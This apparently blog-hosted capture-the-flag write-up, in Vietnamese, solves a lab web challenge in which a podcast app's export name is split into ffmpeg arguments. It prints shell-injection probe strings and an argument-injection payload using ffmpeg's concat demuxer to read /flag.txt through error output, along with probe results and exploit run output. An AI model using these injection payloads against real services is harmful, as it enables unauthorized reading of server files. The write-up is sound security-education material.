---
title: "Splice — Web (Hard)"
date: 2026-09-28 16:53:17 +0700
lastmod_at: 2026-09-28 16:53:17 +0700
categories: [Web]
tags: [h7ctf-quals, Web]
image:
  path: /CTFWU/H7CTF%202026%20Quals/splice/files/de.png
---
{% raw %}
**Flag:** `WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}` · 300 pts · H7TEX 2026 trên WebVerse
**Target:** `https://ced0f13a-5765-splice-5ba63.mystery-challenges.webverselabs-pro.com` (instance Express, đứng sau Cloudflare)
**Không có bundle:** toàn bộ phân tích dựa trên source mà chính app trả về (`/studio`, `/public/css/site.css`, JSON của `/api/render`).

## Đề bài

Tapedeck là dịch vụ podcast hosting. Studio nhận một clip audio rồi "render" thành audiogram
(poster dạng sóng) để tải về. Gợi ý của đề: *"Have a look at how the render names and produces
the files it hands back."* WebVerse gắn nhãn bài là CMDI. Cờ nằm trên instance, không có
artifact nào để mở tại chỗ.

## Phân tích ban đầu

`/studio` phơi rõ ba bước của pipeline:

```html
<form method="post" action="/studio/upload" enctype="multipart/form-data">
  <input type="file" name="clip" accept="audio/*">
</form>

<p class="sub">The export name is used as the poster filename.</p>
<input id="slugInput" name="slug" value="audiogram">
```

và JS gọi `/api/render`:

```js
fetch('/api/render', {method:'POST', headers:{'Content-Type':'application/json'},
  body: JSON.stringify({slug: ..., theme: ...})})
  .then(...)
  // Note: the API also returns an `errors` field on failure. The Studio
  // does not surface it here.
```

Hai điểm rút ra:

1. Tên export đi thẳng vào tên file của output.
2. API có field `errors` mà UI chủ ý không hiển thị → gọi thẳng JSON sẽ ăn được stderr.

Baseline: upload một WAV tự sinh 2 giây, render `slug=audiogram`:

```json
{"ok": true, "outputs": [{"file": "audiogram.png", "url": "/m/b9f13764512c81b7/audiogram.png"}], "errors": null}
```

## Các hướng đã loại

Trước khi chốt đã kiểm tra và loại các kênh sau (log đầy đủ ở `notes.md`). Probe `slug` bằng
ký tự shell:

| slug | phản hồi |
| --- | --- |
| `aa;id` | tạo thật file `aa;id.png` |
| `aa$(id)`, `` aa`id` ``, `aa\|id` | tất cả thành tên file nguyên văn |
| `x' && id && 'y` | ffmpeg: `Unable to find a suitable output format for 'x''` |

1. `slug` được đưa qua shell. Bảng trên: `;`, `$( )`, backtick, `|` đều chỉ thành ký tự
   trong tên file. Không có shell nào đứng sau.
2. argv được quote an toàn trước khi tới ffmpeg. Dòng cuối bảng: payload `x' && id && 'y`
   cho dấu `'` lọt tới ffmpeg, ra `Unable to find a suitable output format for 'x''`.
3. Phải render ảnh rồi OCR, hoặc ghi file đích ra workspace mới đọc được. `errors` chứa
   nguyên stderr của ffmpeg, nên nội dung file đích về trong JSON của chính response.

## Chuỗi khai thác

**Bước 1 - Định vị chỗ ghép lệnh.** Không có shell, nhưng argv thì có:

```
slug = "x -h"
errors: "Unrecognized option 'h.png'.
         Error splitting the argument list: Option not found"
```

`-h.png` xuất hiện như một argv riêng, nghĩa là chuỗi lệnh được tách theo khoảng trắng rồi mới
đưa cho ffmpeg. Tên file `slug + ".png"` không bị quote, nên mọi token đặt sau một dấu cách trở
thành tham số ffmpeg mới.

**Bước 2 - Chọn primitive đọc file.** Với argv injection có hai hướng: `-i` thêm input, hoặc
`-f` đổi demuxer. Hướng ngắn nhất là ép ffmpeg đọc file đích bằng concat demuxer:

```
slug = "a.png -f concat -i /flag.txt b.png"
```

Concat là định dạng script, mỗi dòng phải là `file '...'` hoặc `duration n`. Dòng đầu của
`/flag.txt` không hợp lệ, và ffmpeg đưa nguyên nội dung dòng đó vào thông báo lỗi:

```
[concat @ 0x6145f8caea80] Line 1: unknown keyword 'WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}'
/flag.txt: Invalid data found when processing input
```

Server nhét cả stderr vào `errors`, nên cờ về trong response, không cần render ảnh, không cần
OCR, không cần ghi file ra ngoài workspace.

**Bước 3 - Xác định đường dẫn cờ.** Cùng oracle phân biệt được file có tồn tại hay không:

```
/flag.txt              -> Line 1: unknown keyword 'WEBVERSE{...}'
/flag                  -> No such file or directory
/opt/app/flag.txt      -> No such file or directory
/app/flag.txt          -> No such file or directory
./flag.txt             -> No such file or directory
```

**Bước 4 - Kiểm chứng kết quả không phụ thuộc state.** `exploit.py` tự mở session mới (cookie
`td_session` sinh workspace riêng), upload WAV tự dựng bằng module `wave`, rồi render đúng một
phát. Workspace của lần chạy này là `0d6a6fc0562fc2eb`, khác workspace dùng lúc probe
(`b9f13764512c81b7`), vẫn ra cùng một chuỗi. Cờ được bắt bằng regex trên byte thật sự nhận và
ghi vào `flag.txt`.

## Flag
```bash
python exploit.py https://ced0f13a-5765-splice-5ba63.mystery-challenges.webverselabs-pro.com
```

```
[*] session: td_session=s%3Af9iYs9oShh5WGUU6amVzf3gfG...
[*] upload -> HTTP 200
[*] render -> HTTP 200
[+] WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}
```

```
WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}
```

Nộp tại khối SUBMIT FLAG trên trang WebVerse của challenge
(`/e/YfQq-BkjAX1I9bECP5U9xcsY/c/28`); solve sync ngược về H7TEX theo email, kiểm tra mỗi
~60 giây.

{% endraw %}
